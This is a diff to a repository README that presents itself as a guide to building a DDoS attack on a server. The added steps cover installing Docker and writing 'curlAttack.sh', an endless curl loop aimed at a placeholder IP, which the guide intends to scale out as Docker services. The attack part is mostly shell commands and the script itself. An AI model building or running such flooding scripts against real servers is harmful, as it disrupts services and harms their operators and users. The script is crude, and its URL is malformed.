@@ -11,3 +11,44 @@ This repository will help you to create a DDOS attack on a server. This could be
 - [ ] Setting up Dockerfile
 - [ ] Creating a Custom Docker Image
 - [ ] Creating and Scaling a Service
+
+
+### Installing Docker
+If you have this part already complete feel free to move on to the next, otherwise here is a link that you could follow in order to get this part started.
+
+Please instiall the proper verison for your OS and then return back to this guide. :+1:
+
+https://www.docker.com/community-edition
+
+- [x] Installing Docker
+
+### Creating the Script
+Now that we have Docker installed and running lets get started with creating a directory.
+It doesnt matter where this directory is, but to keep in simple for now I'll go with this
+
+```
+$ mkdir $HOME/DockerAttack
+$ cd $HOME/DockerAttack
+```
+>Following is done through iTerm or a Terminal
+>I personally use vim for this, but any way would really do.
+>$ vim curlAttack.sh
+There's not much to the script, in fact its a simple looping curl, it looks something like this
+```sh
+while true
+do
+#Please use 'man curl' to see what -vk is for, also -X command can be useful too.
+curl -vk https:://<ip>
+#sleep 5
+done
+exit 0
+```
+> I'd actually reccomend to first write a curl command that works for your server in a terminal, then copy paste it into the script.
+
+At this point you could test it out by adding execution permission and then running it.
+```
+$ chmod +x curlAttack.sh
+$ ./curlAttack.sh
+```
+
+- [x] Creating the Script
